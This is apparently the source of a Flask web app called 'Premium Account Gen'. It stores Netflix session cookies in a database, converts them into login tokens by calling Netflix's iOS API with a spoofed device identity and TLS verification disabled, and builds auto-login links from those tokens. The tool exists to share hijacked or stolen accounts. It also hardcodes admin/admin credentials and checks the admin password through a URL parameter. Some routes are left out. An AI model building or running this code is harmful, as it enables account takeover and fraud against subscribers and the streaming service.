#!/usr/bin/env python3
"""
Premium Account Gen - Flask app
Fully fixed version for Render.com
"""

import os
import re
import json
import urllib.parse
from datetime import datetime

import psycopg2
from psycopg2.extras import RealDictCursor
import requests
from flask import Flask, render_template, request, jsonify, redirect, url_for

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "change-this-to-a-long-random-string-in-production")

ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "admin"

DATABASE_URL = os.getenv("DATABASE_URL")

# ====================== COOKIE & NFTOKEN LOGIC ======================
COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

def parse_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}

def extract_cookie_dict(text):
    cookie_dict = {}
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        cookie_dict.update(parse_netscape_cookie_line(line))

    # Regex fallback
    for key in COOKIE_KEYS:
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match:
            cookie_dict[key] = match.group(1)

    return cookie_dict

def fetch_nftoken(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        raise ValueError("Missing NetflixId cookie.")

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    response = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=25, verify=False)
    response.raise_for_status()

    data = response.json()
    token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
    token = token_data.get("token")
    expires = token_data.get("expires")

    if not token:
        raise ValueError("Failed to generate NFToken. Cookie may be expired.")

    return token, expires

def build_watch_links(token):
    pc = f"https://www.netflix.com/?nftoken={token}"
    mobile = f"https://www.netflix.com/unsupported?nftoken={token}"
    tv = f"https://www.netflix.com/?nftoken={token}"
    return pc, mobile, tv

# ====================== DATABASE ======================
def get_db_connection():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS netflix_accounts (
            id SERIAL PRIMARY KEY,
            cookie_text TEXT NOT NULL,
            plan VARCHAR(100) DEFAULT 'Premium',
            country VARCHAR(10) DEFAULT 'US',
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_used TIMESTAMP,
            usage_count INTEGER DEFAULT 0,
            is_active BOOLEAN DEFAULT TRUE
        );
    """)
    conn.commit()
    cur.close()
    conn.close()
    print("✅ Database initialized.")

init_db()

# ====================== ROUTES ======================
@app.route("/")
def dashboard():
    return render_template("index.html")

@app.route("/admin", methods=["GET", "POST"])
def admin_page():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            return render_template("admin.html", admin_pass=ADMIN_PASSWORD)
        else:
            return render_template("admin_login.html", error="Invalid credentials"), 401

    return render_template("admin_login.html")

@app.route("/analytics")
def analytics_page():
    if request.args.get("pass") != ADMIN_PASSWORD:
        return redirect("/admin")
    return render_template("analytics.html")

# ... (rest of the API routes are already in the file)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
